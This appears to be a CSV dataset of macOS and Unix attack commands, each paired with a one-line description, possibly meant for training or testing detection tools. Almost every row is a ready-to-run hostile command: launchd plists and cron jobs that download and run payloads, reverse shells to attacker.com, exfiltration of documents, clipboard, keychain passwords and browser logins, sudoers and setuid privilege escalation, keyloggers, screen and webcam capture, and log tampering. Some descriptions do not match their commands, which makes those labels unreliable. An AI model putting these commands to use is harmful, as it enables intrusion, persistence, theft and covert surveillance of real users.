"cmd","description"
"Appending a malicious cron job to the system's crontab without it being displayed by the 'crontab -l' command.","A scenario where a cron job is used to maintain persistence by executing a rootkit every hour and the cron job is hidden from the regular crontab listings."
"echo '0 * * * * /usr/bin/env bash -c ""./rootkit""' | crontab -","How would such a cron job be structured to execute a rootkit?"
"echo '0 * * * * /usr/bin/env bash -c ""./rootkit""' >> /var/at/tabs/root && echo 'root' >> /usr/lib/cron/cron.allow","And how can the cron job be hidden from regular listings?"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.plist</string>
 <key>ProgramArguments</key>
 <array>
 <string>curl</string>
 <string>-o</string>
 <string>/tmp/script.sh</string>
 <string>http://malicious-url.com/payload.sh</string>
 <string>;</string>
 <string>chmod</string>
 <string>+x</string>
 <string>/tmp/script.sh</string>
 <string>;</string>
 <string>/tmp/script.sh</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.plist && launchctl load ~/Library/LaunchAgents/com.malicious.plist","Persistence via malicious plist file that executes a downloaded script."
"curl -s http://malicious-url.com/fake-update.sh | sh","Malware installation through a disguised command that appears to update software but actually downloads a malicious payload."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.service</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-s</string><string>http://malicious-url.com/payload</string><string>-o</string><string>/tmp/payload</string><string>&&</string><string>chmod</string><string>+x</string><string>/tmp/payload</string><string>&&</string><string>/tmp/payload</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.malicious.service.plist && launchctl load ~/Library/LaunchAgents/com.malicious.service.plist","Persistence via a malicious daemon service added to launchd."
"while true; do screencapture -x ~/Desktop/capture_$(date +%s).png; sleep 60; done && zip -r ~/Desktop/screenshots.zip ~/Desktop/capture_*.png && curl -T ~/Desktop/screenshots.zip ftp://attacker.com/uploads/","Automated screen capture and exfiltration on a macOS system."
"tar -czvf .hidden-archive.tar.gz ~/Documents/sensitive-files/ && mv .hidden-archive.tar.gz ~/.hidden/","Compressing sensitive files in the user's Documents directory and hiding the archive in a dot directory."
"while true; do ffmpeg -f avfoundation -video_size 640x480 -i ""0"" -vframes 1 $(date +%s).jpg; sleep 300; done","Accessing the webcam on macOS to capture snapshots surreptitiously."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.screencapture</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/screencapture</string>
		<string>-x</string>
		<string>/Users/Shared/ScreenCapture.png</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.screencapture.plist && launchctl load ~/Library/LaunchAgents/com.malicious.screencapture.plist","Persistence via malicious plist to enable remote screen capture on macOS."
"curl -o ~/Library/.hidden_keylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hidden_keylogger && echo 'nohup ~/Library/.hidden_keylogger &' >> ~/.zshrc && source ~/.zshrc","Keylogger integration to capture and exfiltrate keystrokes from a macOS system."
"sudo kextload /Library/Extensions/malicious.kext","Persistence via a malicious kernel extension loaded at boot time."
"osascript -e 'tell application ""System Events"" to keystroke ""Logging keystrokes"" using {command down}'","Establishing a system hook to monitor user keystrokes."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/path/to/malicious/script.sh"", hidden:false}'","Adding a login item to execute a script when the user logs in."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations that allow executing commands as root without a password."
"sudo insmod /path/to/malicious_module.ko","Tampering with kernel modules using the visudo NOPASSWD flag to insert a malicious kernel module."
"cp /bin/sh /tmp/privileged_sh && chmod u+s /tmp/privileged_sh","Privilege escalation by exploiting a setuid binary on macOS."
"export PATH=/evil_directory:$PATH","Modifying environment variables for setuid exploitation on macOS."
"echo 'int setuid(uid_t uid) { return 0; }' > preload.c && gcc -shared -o preload.so preload.c && LD_PRELOAD=./preload.so /usr/bin/sudo","LD_PRELOAD exploitation to escalate privileges using setuid binaries."
"sudo chown $(whoami) /etc/sudoers && echo '$(whoami) ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers","Privilege escalation by changing the ownership of sensitive system files to gain unrestricted access."
"sudo chown $(whoami) /etc/sudoers","Privilege escalation by changing the ownership of sensitive system files to gain unrestricted access."
"echo 'curl http://malicious-url.com/payload.sh | sh' >> /usr/local/bin/somescript","Injecting malicious code into existing scripts to execute during normal operations."
"chmod +x /path/to/malicious/script.sh","Manipulating file permissions to allow execution of unauthorized scripts."
"sudo chown root: /usr/local/bin/sensitivefile && chmod 4755 /usr/local/bin/sensitivefile","Privilege escalation by manipulating file permissions and changing ownership of sensitive files."
"sudo -k && date 010100002020 && sudo -v && date -f","Privilege escalation by exploiting sudo timestamp spoofing through system clock modification."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.daemon</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>curl -fsSL http://malicious-url.com/script.sh | sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Persistence via malicious Launch Daemon plist file that executes a shell script from an external server."
"osascript -e 'do shell script ""nvram boot-args=kext-dev-mode=1"" with administrator privileges'","Persistence via unsigned driver exploitation in macOS to bypass kext signing."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/bash</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"tar czf - ~/Documents | openssl enc -aes-256-cbc -e -pass pass:encryption_key | nc -w 3 attacker.com 5555","Exfiltrating sensitive files from the user's Documents directory to a remote server."
"echo 'rdr pass inet proto tcp from any to any port 2222 -> 127.0.0.1 port 22' | sudo pfctl -ef -","Setting up port forwarding on a macOS system to redirect traffic from one port to another for remote access."
"while sleep 1; do pbpaste | nc -q0 attacker.com 1337; done","A scenario where keylogging is achieved by monitoring clipboard data and the captured data is then transmitted to a remote server."
"while true; do screencapture -x ~/Library/Caches/$(date +%s).png; sleep 300; done","Automating screen captures of a macOS system to silently collect information over time."
"echo '0 * * * * curl -fsSL http://malicious-url.com/payload.sh | sh' >> ~/.hidden_cron && crontab ~/.hidden_cron","Persistence via a hidden cron job that downloads and executes a script from a remote server every hour."
"osascript -e 'do shell script ""launchctl load /Library/LaunchDaemons/com.malicious.plist"" with administrator privileges'","Persistence via malicious plist to exploit a race condition for privilege escalation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.malicious.agent</string><key>ProgramArguments</key><array><string>/usr/bin/curl</string><string>-o</string><string>/tmp/remote.sh</string><string>http://malicious-url.com/remote.sh</string></array><key>RunAtLoad</key><true/><key>StartInterval</key><integer>300</integer></dict></plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launchd to maintain remote access on a macOS system."
"echo '%admin ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting misconfigured writable sudoers file which is group-owned."
"cp /usr/bin/env /tmp/; echo 'echo malicious_code' > /tmp/env; chmod +s /tmp/env","Injecting malicious code into setuid executables to gain elevated privileges."
"echo 'nohup bash -i >& /dev/tcp/attacker.com/4444 0>&1' > ~/.hidden && echo '@reboot . ~/.hidden' | crontab -","Persistence via a hidden file that establishes a reverse shell connection on system boot."
"cp /path/to/malicious/Slack.app /Applications/Slack.app && launchctl load -w /Applications/Slack.app/Contents/MacOS/com.trojanized.slack.plist","Persistence via a trojanized version of a communication application."
"Compressing and encoding documents in the ~/Documents/Secrets directory and sending them to a remote server.","A scenario where sensitive documents are automatically compressed and encoded in base64 before being exfiltrated from a macOS system."
"tar -cz ~/Documents/Secrets | base64 | curl -X POST --data-binary @- http://attacker-server.com/upload","What shell command could perform this action without prior installation of additional tools?"
"osascript -e 'tell application ""System Events"" to make login item at end with properties {path:""/Applications/MaliciousApp.app"", hidden:false}'","Persistence via login item addition using AppleScript"
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.daemon</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/curl</string>
 <string>-L</string>
 <string>http://malicious-url.com/script.sh</string>
 <string>|</string>
 <string>/bin/bash</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' | sudo tee /Library/LaunchDaemons/com.malicious.daemon.plist && sudo launchctl load /Library/LaunchDaemons/com.malicious.daemon.plist","Creating a launch daemon for persistent execution of a script"
"echo '*/30 * * * * /usr/bin/curl -fsSL http://malicious-url.com/payload.sh | /bin/bash' | crontab -","Setting up a cron job to periodically run a malicious script"
"osascript -e 'do shell script ""chmod 6777 /path/to/vulnerable/kernel/object"" with administrator privileges'","Privilege escalation by exploiting a race condition vulnerability in the macOS kernel that allows for kernel object manipulation."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/malicious_script.sh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via a malicious Launch Agent that executes a script every log in."
"launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via launch agents by loading a malicious plist file to run a script periodically."
"sudo cp com.malicious.kext.plist /Library/LaunchDaemons/ && sudo launchctl load /Library/LaunchDaemons/com.malicious.kext.plist","Persistence via malicious plist file that loads a kernel extension."
"osascript -e 'tell application ""System Events"" to make new login item at end with properties {path:""/usr/local/bin/hidden_script"", hidden:true}' && curl -o /usr/local/bin/hidden_script http://malicious-url.com/script.sh && chmod +x /usr/local/bin/hidden_script","Creating a hidden login item that executes a script from a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?><!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd""><plist version=""1.0""><dict><key>Label</key><string>com.reverse.shell</string><key>ProgramArguments</key><array><string>/bin/sh</string><string>-c</string><string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string></array><key>RunAtLoad</key><true/></dict></plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Establishing a reverse shell using a launch agent."
"scp ~/.bash_history user@remote-server.com:/path/to/store/","Data exfiltration by locating and sending .bash_history file to a remote server."
"sudo systemsetup -setremotelogin on && echo 'ssh-rsa AAA... unauthorized_key' >> ~/.ssh/authorized_keys","Remote access setup by enabling SSH server and adding an unauthorized SSH key."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.agent</string>
	<key>ProgramArguments</key>
	<array>
		<string>curl</string>
		<string>-fsSL</string>
		<string>http://malicious-url.com/script.sh</string>
		<string>|</string>
		<string>sh</string>
	</array>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Launch agent creation to periodically download and execute a script from a given URL."
"echo 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' >> ~/.bash_profile","Persistent reverse shell setup by injecting code into .bash_profile."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.reverse.shell</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell connection on system boot."
"osascript -e 'do shell script ""chown root: /tmp/suid; chmod 4755 /tmp/suid"" with administrator privileges'","Privilege escalation by exploiting race conditions in macOS kernel file system operations."
"curl -o ~/Library/LaunchAgents/com.startup.plist http://malicious-url.com/startup.plist && launchctl load ~/Library/LaunchAgents/com.startup.plist","Persistence via malicious plist file to execute a downloaded script every boot."
"curl -s http://malicious-url.com/exploitkit.tar.gz | tar xz -C /tmp && /tmp/exploitkit/install.sh","Downloading an exploit kit from a remote server and executing it."
"bash -c 'system_profiler SPHardwareDataType SPSoftwareDataType | curl -F ""data=@-"" http://attacker.com/collect.php'","Post-exploitation script execution to gather system information and send it to a remote server."
"scp ~/Library/Application\ Support/Google/Chrome/Default/Login\ Data username@remote-host:/path/to/destination","Using scp to move laterally and copy sensitive files from the current machine to another host in the network."
"tar -czf /tmp/sensitive_data.tgz ~/Documents/Sensitive && scp /tmp/sensitive_data.tgz compromised_user@attacker.com:/path/to/exfiltrate/","Compressing sensitive files in the user's home directory and exfiltrating them via SSH using scp from a compromised user account."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.reverse</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.reverse.plist && launchctl load ~/Library/LaunchAgents/com.malicious.reverse.plist","Persistence via malicious plist to establish a reverse shell on macOS."
"touch -t 202301010000 /var/db/sudo","Privilege escalation by exploiting sudo timestamp spoofing."
"chmod +s /usr/bin/env","Gaining elevated privileges through a misconfigured setuid binary."
"/usr/bin/env /bin/sh -p","Executing a command with elevated privileges by abusing setuid permissions."
"cp /usr/bin/env /tmp/evil_env && echo '#!/bin/sh' > /tmp/evil_env && echo '/bin/sh' >> /tmp/evil_env && chmod +x /tmp/evil_env && export PATH=/tmp:$PATH && /path/to/setuid_script.sh","Privilege escalation by injecting code into a setuid script to gain root access."
"echo 'Jan 1 00:00:00 localhost fake_process[123]: fake log entry' >> /var/log/system.log","Tampering with system logs to mask unauthorized access."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.rootkit</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/local/bin/rootkit</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.rootkit.plist && launchctl load ~/Library/LaunchAgents/com.malicious.rootkit.plist","Persistence via malicious plist to maintain rootkit control."
"csrutil disable","Bypassing system integrity protection to modify protected system files."
"codesign -s 'Developer ID Application: Malicious Developer (ID12345678)' -f --deep /path/to/malicious.app","Abusing trusted certificates to sign a malicious application."
"curl -s http://malicious-url.com/update.pkg > /tmp/update.pkg && sudo installer -pkg /tmp/update.pkg -target /","Malware installation via a disguised software update command on macOS."
"echo '*/5 * * * * osascript -e ""do shell script \""/path/to/malicious/script.sh\"" with administrator privileges""' | crontab -","Persistence through a malicious cron job that elevates privileges and executes every 5 minutes."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to maintain a reverse shell connection."
"ssh-keyscan -t rsa,dsa host.example.com 2>&1 | grep -v '^#' | tee -a ~/.ssh/known_hosts","Gaining unauthorized remote access to a macOS system by manipulating SSH key exchange"
"zip -r /tmp/documents.zip ~/Documents && openssl enc -aes-256-cbc -salt -in /tmp/documents.zip -out /tmp/encrypted_documents.zip.enc -k password && curl --upload-file /tmp/encrypted_documents.zip.enc https://transfer.sh/encrypted_documents.zip.enc","Exfiltrating documents from a macOS system and automatically transmitting them while evading network monitoring and encrypting the traffic."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.reverse.shell</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/sh</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.reverse.shell.plist && launchctl load ~/Library/LaunchAgents/com.reverse.shell.plist","Persistence via malicious plist to establish a reverse shell on system boot."
"sudo tcpdump -i any -w ~/Desktop/traffic_capture.pcap","Intercepting network traffic by installing a packet sniffer on a macOS system."
"nmap -T4 -F 192.168.1.0/24","Performing a stealthy port scan on a local network from a macOS device."
"DYLD_INSERT_LIBRARIES=/path/to/malicious.dylib /usr/bin/sudo","Privilege escalation by injecting code into privileged processes through dylib hijacking."
"export PATH=/malicious/directory:$PATH","Environment variable manipulation to escalate privileges."
"zip -rj /tmp/.hidden_documents.zip ~/Documents/Sensitive/* && curl -T /tmp/.hidden_documents.zip ftp://attacker.com --user username:password","Compression of sensitive documents in a hidden directory and exfiltration to a remote server."
"sshpass -p 'password123' ssh user@victim.com","A botnet is performing an SSH brute force attack to gain unauthorized remote access to macOS systems."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.malicious.agent</string>
 <key>ProgramArguments</key>
 <array>
 <string>/bin/sh</string>
 <string>-c</string>
 <string>curl -fsSL http://malicious-url.com/payload.sh | sh</string>
 </array>
 <key>StartInterval</key>
 <integer>600</integer>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.agent.plist && launchctl load ~/Library/LaunchAgents/com.malicious.agent.plist","Persistence via malicious LaunchAgent to execute a command every 10 minutes."
"echo '*/30 * * * * /usr/bin/python /tmp/.hidden_payload.py' | sudo tee -a /etc/crontab","Privilege escalation by injecting malicious code into system-wide cron directories for persistence."
"TF=$(mktemp -u); echo '#!/bin/bash
/bin/bash -i' > $TF; chmod +x $TF; export PATH=$(dirname $TF):$PATH; /usr/local/bin/suid_binary","Privilege escalation by exploiting a setuid binary on macOS to run a shell with elevated privileges."
"export PATH=/path/to/malicious/directory:$PATH; /path/to/setuid/binary","Modifying environment variables to exploit setuid binaries for privilege escalation."
"echo 'RHOST=""attacker.com""; RPORT=4444; TF=$(mktemp -u); echo ""#!/bin/bash
bash -i >& /dev/tcp/$RHOST/$RPORT 0>&1"" > $TF; chmod +x $TF; export PATH=$(dirname $TF):$PATH; /usr/local/bin/suid_binary' >> ~/.bash_profile","Creating environment variable persistence for a reverse shell using a setuid binary."
"curl -s http://malicious-url.com/keylogger.sh | bash","Keylogger installation using a script to capture keystrokes and save them to a file."
"while true; do pbpaste > /tmp/clipboard.txt; sleep 10; done","Clipboard monitoring to track and store copied text data."
"while true; do curl -X POST --data-binary @/tmp/clipboard.txt http://malicious-url.com/collect; sleep 300; done","Clipboard data analysis by periodically sending copied contents to a remote server."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
 <key>Label</key>
 <string>com.hijack.rdp</string>
 <key>ProgramArguments</key>
 <array>
 <string>/usr/bin/osascript</string>
 <string>-e</string>
 <string>tell application \""Remote Desktop Connection\"" to open</string>
 <string>-e</string>
 <string>tell application \""System Events\"" keystroke \""password\""</string>
 <string>-e</string>
 <string>tell application \""System Events\"" keystroke return</string>
 </array>
 <key>RunAtLoad</key>
 <true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.hijack.rdp.plist && launchctl load ~/Library/LaunchAgents/com.hijack.rdp.plist","Persistence via malicious plist to enable remote desktop protocol session hijacking."
"zip -r report.zip confidential.docx && mv report.zip report.jpg && uuencode report.jpg report.jpg | mail -s 'Annual Report' target@example.com","Data exfiltration via email by masquerading the file type of an attachment."
"open ~/Downloads/zero_day_exploit_attachment.docm","Malicious payload execution from an email attachment containing a zero-day exploit."
"echo 'nohup bash -i >& /dev/tcp/192.168.1.10/8080 0>&1' >> ~/.bash_profile","Persistence via a reverse shell by appending a command to the user's .bash_profile."
"cp /bin/sh /tmp/privileged_sh && chmod 4755 /tmp/privileged_sh","Gaining elevated privileges by exploiting a setuid binary."
"sudo tcpdump -i any -w ~/Desktop/traffic_capture.pcap","Persistence via unauthorized network traffic sniffing on a macOS system."
"for port in {1..1023}; do nc -zv localhost $port 2>&1 | grep succeeded; done","Initiating unauthorized port scanning using native macOS commands."
"while true; do for port in {1..1023}; do nc -zv localhost $port 2>&1 | grep succeeded; sleep 60; done; done","Automated script to scan and report open ports periodically."
"osascript -e 'do shell script ""curl -fsSL http://malicious-url.com/payload.scpt -o /Library/ScriptingAdditions/payload.scpt && osacompile -o /Library/ScriptingAdditions/payload.osax /Library/ScriptingAdditions/payload.scpt"" with administrator privileges'","Persistence via scripting addition that executes a payload each time an application is launched."
"echo '#!/bin/bash\nbash -i >& /dev/tcp/attacker.com/4444 0>&1' > /Library/StartupItems/ReverseShell/ReverseShell && chmod +x /Library/StartupItems/ReverseShell/ReverseShell && echo '{\n ""Description"" : ""Startup Item ReverseShell"",\n ""Provides"" : [ ""ReverseShell"" ],\n ""OrderPreference"" : ""None"",\n ""Messages"" : {\n ""start"" : ""Starting ReverseShell"",\n ""stop"" : ""Stopping ReverseShell""\n }\n}' > /Library/StartupItems/ReverseShell/StartupParameters.plist && chmod +x /Library/StartupItems/ReverseShell/StartupParameters.plist","Creating a startup item that initiates a reverse shell connection to the attacker's server."
"sudo kextload /Library/Extensions/malicious.kext","Loading a malicious kernel extension that hides files and processes."
"zip -er confidential.zip ~/Documents/*.pdf && echo 'Please find the documents attached.' | mail -s 'Confidential Documents' -A confidential.zip recipient@example.com","A script that finds all PDFs in the Documents folder, compresses them into a password-protected ZIP file, and then emails it to an external address."
"for host in $(cat hosts.txt); do while :; do sshpass -p 'password123' ssh -o StrictHostKeyChecking=no user@$host; done; done","Persistent SSH brute force attack using a loop to repeatedly attempt connections to a list of known hosts."
"launchctl unload ~/Library/LaunchAgents/com.legitimate.agent.plist && cp ~/evil/com.malicious.agent.plist ~/Library/LaunchAgents/com.legitimate.agent.plist && launchctl load ~/Library/LaunchAgents/com.legitimate.agent.plist","Persistence via malicious plist by unloading a legitimate launch agent and replacing it with a malicious one."
"echo '<?xml version=""1.0"" encoding=""UTF-8""?>
<!DOCTYPE plist PUBLIC ""-//Apple//DTD PLIST 1.0//EN"" ""http://www.apple.com/DTDs/PropertyList-1.0.dtd"">
<plist version=""1.0"">
<dict>
	<key>Label</key>
	<string>com.malicious.backdoor</string>
	<key>ProgramArguments</key>
	<array>
		<string>/usr/bin/bash</string>
		<string>-c</string>
		<string>bash -i >& /dev/tcp/attacker.com/4444 0>&1</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
</dict>
</plist>' > ~/Library/LaunchAgents/com.malicious.backdoor.plist && launchctl load ~/Library/LaunchAgents/com.malicious.backdoor.plist","Persistence via malicious plist file to establish a backdoor."
"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers","Privilege escalation by exploiting sudo misconfigurations."
"touch -t 202101010000 /var/db/sudo; sudo -k; sudo command_to_run","Privilege escalation by exploiting sudo timestamp spoofing when NOPASSWD is set for specific commands."
"security find-generic-password -wa '*' | mail -s 'Credentials' attacker@example.com","Exfiltrating local user credentials and sending them to an external email address using macOS native commands."
"script -q /dev/null top -l 1 | grep -v grep > /tmp/.hidden_process_list","Stealthily monitoring running processes in macOS without leaving traces in system logs."
"chmod u+s /usr/local/bin/somebinary","Privilege escalation by exploiting vulnerable setuid binaries on macOS."
"export PATH=/evil/directory:$PATH","Modifying environment variables to exploit setuid binaries for privilege escalation."
"IFS=:;export PATH=/tmp:$PATH","Abusing IFS to manipulate setuid binary execution."
"curl -o ~/Library/.hidden_keylogger http://malicious-url.com/keylogger && chmod +x ~/Library/.hidden_keylogger && echo 'nohup ~/Library/.hidden_keylogger &' >> ~/.zshrc","Persistence via keylogger installation in macOS."
"while true; do screencapture -x ~/Library/Caches/.screencapture_$(date +%s).jpg; sleep 300; done &","Capture and record screen activity silently on macOS."
